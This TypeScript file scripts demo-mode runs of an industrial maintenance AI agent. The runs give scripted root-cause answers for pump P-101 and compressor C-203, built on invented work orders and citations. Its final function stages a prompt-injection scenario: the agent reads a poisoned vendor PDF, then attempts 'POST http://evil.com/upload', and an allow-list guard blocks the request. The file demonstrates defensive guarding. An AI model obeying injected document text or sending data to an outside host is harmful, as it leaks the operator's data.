// Scripted agent runs for demo mode. They emit the same AgentEvent stream
// the backend will send over SSE, so the UI code doesn't change.

import { addBlocked, logAudit } from './store'
import type { AgentEvent, Citation } from './types'

interface ScriptStep {
  tool: string
  input: string
  summary: string
  ms: number
}

interface Script {
  steps: ScriptStep[]
  answer: string
  citations: Citation[]
  canDraft: boolean
}

const P101_CITATIONS: Citation[] = [
  {
    id: 1,
    kind: 'inspection',
    label: 'Inspection · p. 2',
    title: 'Inspection report IR-2026-118 · page 2',
    quote: 'Misalignment observed: 0.3 mm',
  },
  {
    id: 2,
    kind: 'manual',
    label: 'Manual · p. 18',
    title: 'Centrifugal pump manual · page 18',
    quote:
      'Shaft misalignment beyond 0.05 mm loads the seal faces unevenly and is a leading cause of premature mechanical seal wear.',
  },
  {
    id: 3,
    kind: 'work_orders',
    label: 'Work orders',
    title: 'P-101 work orders · last 180 days',
    quote: '4 × mechanical seal leakage: 02 Jun, 22 Jul, 15 Sep, 02 Nov 2026 (WO-0423, WO-0441, WO-0465, WO-0486)',
  },
]

const SCRIPTS: { match: RegExp; script: Script }[] = [
  {
    match: /p-?101|feed pump|keep failing/i,
    script: {
      steps: [
        { tool: 'get_asset_history', input: 'tag=P-101', summary: '25 work orders, 4 seal failures in 180 d', ms: 400 },
        { tool: 'read_inspection', input: 'tag=P-101', summary: 'Misalignment found', ms: 1200 },
        { tool: 'search_manuals', input: 'seal failure misalignment', summary: '2 relevant passages', ms: 800 },
        { tool: 'predict_risk', input: 'tag=P-101', summary: 'Risk 96/100 (high)', ms: 300 },
      ],
      answer:
        '## Likely root cause: shaft misalignment\n' +
        'P-101 has had four mechanical seal failures in the last 180 days, and the gap between them fell from about 150 days to 51 [3]. ' +
        'The latest inspection on 12 Nov 2026 found 0.3 mm shaft misalignment and moderate seal wear [1]. ' +
        'The pump manual says misalignment beyond 0.05 mm loads the seal faces unevenly and wears seals early [2]. ' +
        'The risk model agrees: it scores P-101 at 96/100, driven by overstrain (torque × wear), the load a misaligned shaft puts on the seal. ' +
        'Each repair replaced the seal but left the misalignment, so the failure keeps coming back.\n' +
        '## Recommended next step\n' +
        'Laser-align the pump and motor shafts to within 0.05 mm before the next seal replacement, then check the seal flush plan. ' +
        'Confirm the finding with a reliability engineer.',
      citations: P101_CITATIONS,
      canDraft: true,
    },
  },
  {
    match: /risk next|at risk|next/i,
    script: {
      steps: [
        { tool: 'get_bad_actors', input: 'top_n=5', summary: '3 flagged', ms: 350 },
        { tool: 'predict_risk', input: 'tag=P-101', summary: 'Risk 96/100 (high)', ms: 300 },
        { tool: 'predict_risk', input: 'tag=C-203', summary: 'Risk 93/100 (high)', ms: 300 },
        { tool: 'predict_risk', input: 'tag=E-302', summary: 'Risk 45/100 (medium)', ms: 300 },
      ],
      answer:
        '## Assets most at risk next\n' +
        '1. P-101 Feed pump: risk 96/100, driven by overstrain (torque × wear). Four seal failures in 180 days [1].\n' +
        '2. C-203 Recycle gas compressor: risk 93/100, a heat-dissipation problem. Three bearing-overheating events; the gap between them fell from 300 to 60 days [1].\n' +
        '3. E-302 VDU preheat exchanger: risk 45/100. Fouled three times in 180 days [1].\n' +
        '## Recommended next step\n' +
        'Prioritise the P-101 alignment check this week, then the C-203 lube oil and cooler check.',
      citations: [
        { id: 1, kind: 'work_orders', label: 'Bad-actor ranking', title: 'Bad-actor ranking · last 180 days', quote: 'P-101 score 19.9 · C-203 score 16.2 · E-302 score 6.0 (all flagged)' },
      ],
      canDraft: false,
    },
  },
  {
    match: /c-?203|compressor/i,
    script: {
      steps: [
        { tool: 'get_asset_history', input: 'tag=C-203', summary: '25 work orders', ms: 400 },
        { tool: 'predict_risk', input: 'tag=C-203', summary: 'Risk 93/100 (high)', ms: 300 },
        { tool: 'search_manuals', input: 'compressor bearing overheating', summary: '3 passages', ms: 700 },
      ],
      answer:
        '## C-203 Recycle gas compressor\n' +
        'Three bearing-overheating events in 180 days (17 Jun, 11 Aug, 15 Oct); the gap between them fell from 300 to 60 days, with ₹6.6 L in repair cost [1]. ' +
        'The risk model flags a heat-dissipation problem: the process-to-air temperature margin is only 8.1 K. ' +
        'The compressor manual links repeated bearing overheating to degraded lube oil and a fouled oil cooler [2].\n' +
        '## Recommended next step\n' +
        'Sample and replace the lube oil, clean the oil cooler, then trend NDE bearing temperature for two weeks.',
      citations: [
        { id: 1, kind: 'work_orders', label: 'Work orders', title: 'C-203 work orders · last 180 days', quote: '3 × bearing overheating (WO-0427, WO-0450, WO-0478), ₹6.6 L total' },
        { id: 2, kind: 'manual', label: 'Manual · p. 41', title: 'Compressor manual · page 41', quote: 'Recurring bearing overheating usually points to lube oil degradation or a fouled oil cooler.' },
      ],
      canDraft: false,
    },
  },
]

const FALLBACK: Script = {
  steps: [{ tool: 'get_bad_actors', input: 'top_n=10', summary: '10 assets', ms: 350 }],
  answer:
    '## Demo mode\n' +
    'This screen is running on demo data, so only a few questions have scripted answers. ' +
    'Try "Why does P-101 keep failing?", "Which assets are at risk next?" or "Summarise C-203".',
  citations: [],
  canDraft: false,
}

/** Runs a scripted answer. Returns a cancel function. */
export function runMockAgent(question: string, onEvent: (e: AgentEvent) => void): () => void {
  const script = SCRIPTS.find((s) => s.match.test(question))?.script ?? FALLBACK
  let cancelled = false
  const timers: number[] = []
  const later = (ms: number, fn: () => void) =>
    new Promise<void>((resolve) => {
      timers.push(window.setTimeout(() => (cancelled ? resolve() : (fn(), resolve())), ms))
    })

  void (async () => {
    for (const [i, s] of script.steps.entries()) {
      if (cancelled) return
      const stepId = `s${i}`
      onEvent({ type: 'step', step: { id: stepId, tool: s.tool, summary: 'Running…', status: 'running' } })
      await later(s.ms, () => {
        onEvent({ type: 'step', step: { id: stepId, tool: s.tool, summary: s.summary, status: 'done', duration_ms: s.ms } })
        logAudit(s.tool, s.input, s.summary)
      })
    }
    // Stream the answer in small chunks
    const words = script.answer.split(/(\s+)/)
    for (let i = 0; i < words.length; i += 3) {
      if (cancelled) return
      await later(28, () => onEvent({ type: 'token', text: words.slice(i, i + 3).join('') }))
    }
    if (!cancelled) onEvent({ type: 'done', citations: script.citations, can_draft_work_order: script.canDraft })
  })()

  return () => {
    cancelled = true
    timers.forEach(clearTimeout)
  }
}

/** The poisoned vendor PDF scenario: agent reads it, tries to send data out, guard blocks it. */
export function runMockInjection(onEvent: (e: AgentEvent) => void): () => void {
  const timers: number[] = []
  onEvent({ type: 'step', step: { id: 'i0', tool: 'search_manuals', summary: 'Running…', status: 'running' } })
  timers.push(
    window.setTimeout(() => {
      onEvent({ type: 'step', step: { id: 'i0', tool: 'search_manuals', summary: 'Read vendor_seal_datasheet.pdf', status: 'done', duration_ms: 600 } })
      logAudit('search_manuals', 'seal datasheet', 'vendor_seal_datasheet.pdf p. 3')
      onEvent({ type: 'step', step: { id: 'i1', tool: 'external_request', summary: 'POST http://evil.com/upload', status: 'running' } })
    }, 600),
    window.setTimeout(() => {
      const attempt = addBlocked()
      onEvent({ type: 'step', step: { id: 'i1', tool: 'external_request', summary: 'Blocked: not on allow-list', status: 'blocked', duration_ms: 2 } })
      onEvent({ type: 'blocked', attempt })
    }, 1100),
  )
  return () => timers.forEach(clearTimeout)
}
